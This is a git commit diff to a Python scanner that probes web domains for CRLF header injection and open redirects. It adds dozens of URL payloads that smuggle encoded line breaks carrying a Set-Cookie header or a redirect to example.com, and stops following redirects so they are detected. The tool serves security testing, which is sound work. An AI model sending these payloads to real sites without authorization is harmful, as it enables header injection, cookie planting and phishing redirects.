1cac2a8becc58056f59b7a48b281954e87709ddd
dkusliy <dkusliy@gmail.com>
2016-05-12 00:59:55 +0300

    add open redirect

--- http_header_inj.py
+++ http_header_inj.py
@@ -46,6 +46,8 @@ class CrlfInj:
         self.tmpl = [
             '/crlf_test/../',
             '/crlf_test/%2e%2e/',
+            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
             '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
             '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
             '/%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
@@ -54,8 +56,20 @@ class CrlfInj:
             '/\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
             '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
             '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
+            '/%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/?%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/?%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/?%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/?%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
             '/?crlf_test/../',
             '/?crlf_test/%2e%2e/',
+            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/?%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
             '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
             '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
             '/?%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
@@ -68,13 +82,115 @@ class CrlfInj:
             '/?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
             '/?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
             '/?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
-            '/?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val'
+            '/?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/xxx?crlf_test/../',
+            '/xxx?crlf_test/%2e%2e/',
+            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/xxx%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
+            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
+            '/xxx%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
+            '/xxx%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
+            '/xxx\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
+            '/xxx\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
+            '/xxx\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
+            '/xxx\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
+            '/xxx?lang=%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/xxx?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/xxx?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/xxx?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/xxx?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+
+
+            '/%0aexample.com',
+            '/%0dexample.com',
+            '/%0aexample.com/%2e%2e/',
+            '/%0aexample.com/../',
+            '/%0d%0aexample.com%0d%0aX:/%2e%2e/',
+            '/%0d%0aexample.com%0d%0aX:/../',
+            '/\\r\\nexample.com\\r\\nX:/%2e%2e/',
+            '/\\r\\nexample.com\\r\\nX:/../',
+            '/\\nexample.com\\nX:/%2e%2e/',
+            '/\\nexample.com\\nX:/../',
+            '/%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/%c4%8aexample.com',
+            '/%E5%98%8A%E5%98%8Dexample.com',
+            '/%E5%98%8D%E5%98%8Aexample.com',
+            '/%E5%98%8Aexample.com',
+            '/?%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?%c4%8aexample.com',
+            '/?%E5%98%8A%E5%98%8Dexample.com',
+            '/?%E5%98%8D%E5%98%8Aexample.com',
+            '/?%E5%98%8A',
+            '/?%0aexample.com',
+            '/?%0dexample.com',
+            '/?%0aexample.com/%2e%2e/',
+            '/?%0aexample.com/../',
+            '/?%0d%0aexample.com%0d%0aX:/%2e%2e/',
+            '/?%0d%0aexample.com%0d%0aX:/../',
+            '/?\\r\\nexample.com\\r\\nX:/%2e%2e/',
+            '/?\\r\\nexample.com\\r\\nX:/../',
+            '/?\\nexample.com\\nX:/%2e%2e/',
+            '/?\\nexample.com\\nX:/../',
+            '/?%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?%c4%8aexample.com',
+            '/?%E5%98%8A%E5%98%8Dexample.com',
+            '/?%E5%98%8D%E5%98%8Aexample.com',
+            '/?%E5%98%8Aexample.com',
+            '/?lang=%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?lang=%c4%8aexample.com',
+            '/?lang=%E5%98%8A%E5%98%8Dexample.com',
+            '/?lang=%E5%98%8D%E5%98%8Aexample.com',
+            '/?lang=%E5%98%8Aexample.com',
+            '/%0ahttp://example.com',
+            '/%0dhttp://example.com',
+            '/%0ahttp://example.com/%2e%2e/',
+            '/%0ahttp://example.com/../',
+            '/%0d%0ahttp://example.com%0d%0aX:/%2e%2e/',
+            '/%0d%0ahttp://example.com%0d%0aX:/../',
+            '/\\r\\nhttp://example.com\\r\\nX:/%2e%2e/',
+            '/\\r\\nhttp://example.com\\r\\nX:/../',
+            '/\\nhttp://example.com\\nX:/%2e%2e/',
+            '/\\nhttp://example.com\\nX:/../',
+            '/%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/%c4%8ahttp://example.com',
+            '/%E5%98%8A%E5%98%8Dhttp://example.com',
+            '/%E5%98%8D%E5%98%8Ahttp://example.com',
+            '/%E5%98%8Ahttp://example.com',
+            '/?%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?%c4%8ahttp://example.com',
+            '/?%E5%98%8A%E5%98%8Dhttp://example.com',
+            '/?%E5%98%8D%E5%98%8Ahttp://example.com',
+            '/?%E5%98%8A',
+            '/?%0ahttp://example.com',
+            '/?%0dhttp://example.com',
+            '/?%0ahttp://example.com/%2e%2e/',
+            '/?%0ahttp://example.com/../',
+            '/?%0d%0ahttp://example.com%0d%0aX:/%2e%2e/',
+            '/?%0d%0ahttp://example.com%0d%0aX:/../',
+            '/?\\r\\nhttp://example.com\\r\\nX:/%2e%2e/',
+            '/?\\r\\nhttp://example.com\\r\\nX:/../',
+            '/?\\nhttp://example.com\\nX:/%2e%2e/',
+            '/?\\nhttp://example.com\\nX:/../',
+            '/?%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?%c4%8ahttp://example.com',
+            '/?%E5%98%8A%E5%98%8Dhttp://example.com',
+            '/?%E5%98%8D%E5%98%8Ahttp://example.com',
+            '/?%E5%98%8Ahttp://example.com',
+            '/?lang=%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?lang=%c4%8ahttp://example.com',
+            '/?lang=%E5%98%8A%E5%98%8Dhttp://example.com',
+            '/?lang=%E5%98%8D%E5%98%8Ahttp://example.com',
+            '/?lang=%E5%98%8Ahttp://example.com',
+
         ]
         self.test_params = [
             'crlf_test',
             'Injected',
             'XSS',
             'ha.ckers.org',
+            'example.com',
+            'www.test.com',
         ]
         self.headers = {
             'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.11.2; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/44'
@@ -84,9 +200,18 @@ class CrlfInj:
             with open(self.tmpl_file,'r') as f:
                 for line in f:
                     self.tmpl.append('/?' + line.strip())
+                    self.tmpl.append('/xxx' + line.strip())
+                    self.tmpl.append('/' + line.strip())
                     self.tmpl.append('/' + line.strip() + '/')
                     self.tmpl.append('/' + line.strip() + '/../')
                     self.tmpl.append('/' + line.strip() + '/%2e%2e/')
+
+                    self.tmpl.append('/?' + line.strip() + 'example.com')
+                    self.tmpl.append('/xxx' + line.strip() + 'example.com')
+                    self.tmpl.append('/' + line.strip() + 'example.com')
+                    self.tmpl.append('/?' + line.strip() + 'http://example.com')
+                    self.tmpl.append('/xxx' + line.strip() + 'http://example.com')
+                    self.tmpl.append('/' + line.strip() + 'http://example.com')
         except Exception as e:
             logging.error(bcolors.FAIL + 'CrlfInj:prepare (%s)' + bcolors.ENDC, e)
 
@@ -94,7 +219,7 @@ class CrlfInj:
         for template in self.tmpl:
             uri = url + template
             try:
-                r = requests.get(uri, headers = self.headers, timeout = 10)
+                r = requests.get(uri, headers = self.headers, timeout = 10, allow_redirects=False)
                 for test in self.test_params:
                     #if test in r.text:
                         #logging.warning(bcolors.WARNING + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
@@ -130,6 +255,7 @@ def main():
     crlf = CrlfInj()
     crlf.prepare()
 
+
     # read file with DNS answer
     for line in Params.file:
         if Params.type == 'D':
@@ -145,7 +271,7 @@ def main():
             domain = match.group(2)
             logging.warning(bcolors.BOLD + "domain: (%s)" + bcolors.ENDC, domain)
             url = 'http://' + domain
-            crlf.do_it(url)
+            #crlf.do_it(url)
             url = 'https://' + domain
             crlf.do_it(url)
 
